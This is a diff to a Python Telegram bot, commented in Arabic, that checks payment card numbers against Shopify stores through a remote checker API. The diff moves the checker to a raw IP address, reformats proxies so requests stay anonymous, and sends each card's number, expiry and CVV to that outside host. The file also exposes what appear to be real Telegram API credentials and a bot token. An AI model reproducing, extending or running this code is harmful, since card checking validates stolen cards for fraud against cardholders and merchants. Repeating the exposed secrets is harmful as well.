@@ -13,7 +13,8 @@ API_ID = 39825025
 API_HASH = '47170fd9a11b3f591bbc56849519f0f8'
 BOT_TOKEN = '8827673793:AAHKJphZzbQwOKBZS2pHLTDekPvYUrsJT6Y'
 ADMIN_ID = [1707478010]
-CHECKER_API_URL = '‏https://haters.cxchk.site/shopii'
+CHECKER_API_URL = '‏http://187.77.70.6:5000/shopify
+'
 
 PREMIUM_USERS_FILE = "premium_users.txt"
 SITES_FILE = 'sites.txt'
@@ -183,7 +184,7 @@ def extract_cc(text):
 
 async def check_card(card, site, proxy):
     try:
-        # 1. تنظيف بيانات البطاقة من الأقواس
+        # 1. تنظيف بيانات البطاقة
         clean_card = card.replace('{', '').replace('}', '').strip()
 
         parts = clean_card.split('|')
@@ -193,12 +194,17 @@ async def check_card(card, site, proxy):
         if not site.startswith('http'):
             site = f'https://{site}'
 
-        # 2. إعداد البروكسي
+        # 2. تحويل البروكسي إلى الصيغة التي يطلبها الـ API الجديد (http://...)
         proxy_str = None
         if proxy:
-            proxy_parts = proxy.split(':')
-            if len(proxy_parts) >= 2:
-                proxy_str = proxy 
+            proxy_clean = proxy.strip()
+            if len(proxy_clean.split(':')) == 4:
+                p_parts = proxy_clean.split(':')
+                proxy_str = f"http://{p_parts[2]}:{p_parts[3]}@{p_parts[0]}:{p_parts[1]}"
+            elif len(proxy_clean.split(':')) == 2:
+                proxy_str = f"http://{proxy_clean}"
+            else:
+                proxy_str = proxy_clean
 
         # 3. إعداد البيانات للرابط الجديد
         params = {
@@ -208,8 +214,8 @@ async def check_card(card, site, proxy):
         if proxy_str:
             params['proxy'] = proxy_str
 
-        # 4. الاتصال بالموقع (استخدام الرابط الجديد)
-        url = "https://haters.cxchk.site/shopii"
+        # 4. الاتصال بالـ API الجديد
+        url = CHECKER_API_URL
         timeout = aiohttp.ClientTimeout(total=100)
 
         async with aiohttp.ClientSession(timeout=timeout) as session:
@@ -219,14 +225,13 @@ async def check_card(card, site, proxy):
 
                 raw = await resp.json(content_type=None)
 
-        # 5. تحليل الرد (المنطق الأصلي للبوت)
-        response_msg = raw.get('Response', '')
-        price = raw.get('Price', '-')
+        # 5. تحليل الرد (دعم الحروف الكبيرة والصغيرة في الـ API)
+        response_msg = raw.get('Response', raw.get('response', ''))
+        price = raw.get('Price', raw.get('price', '-'))
         if price != '-' and price != 0:
             price = f"${price}"
-        gateway = raw.get('Gateway', 'Shopify')
+        gateway = raw.get('Gateway', raw.get('gateway', 'Shopify'))
 
-        # استخدام دالة is_site_dead الموجودة مسبقاً في ملفك
         if is_site_dead(response_msg, gateway, price):
             return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gateway, 'price': price}
 
@@ -241,6 +246,7 @@ async def check_card(card, site, proxy):
 
     except Exception as e:
         return {'status': 'Dead', 'message': str(e), 'card': card, 'gateway': 'Unknown', 'price': '-'}
+
 
 
 async def check_card_with_retry(card, sites, proxies, max_retries=2):
